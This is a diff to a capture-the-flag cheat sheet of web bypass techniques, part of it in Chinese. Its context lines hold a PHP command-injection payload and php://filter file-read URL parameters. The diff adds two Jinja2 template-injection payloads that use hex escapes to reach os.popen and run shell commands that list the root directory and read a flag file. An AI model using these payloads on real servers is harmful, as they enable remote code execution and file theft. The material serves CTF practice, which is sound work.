@@ -1,4 +1,4 @@
-# Web bypass
+# Web - PHP bypass
 
 - [Bypass Linux Shell Restrictions](#linux-shell-bypass)
 - 空格绕过 `a=system ('cat /flag');`
@@ -37,6 +37,12 @@
 
 `?text=data://test/plain,welcome to the zjctf&file=php://filter/resource=useless.php`
 `?text=data://test/plain,I have a dream&file=php://filter/resource=next.php`
+# Web - Python bypass
+
+```py
+{{ config.__class__.__init__.__globals__['\x6f\x73'].__getattribute__('\x70\x6f\x70\x65\x6e')('ls /').read() }} 
+{{ config.__class__.__init__.__globals__['\x6f\x73'].__getattribute__('\x70\x6f\x70\x65\x6e')('cat /this_is_the_fla""g.txt').read() }} 
+```
 
 # Cmd bypass
 
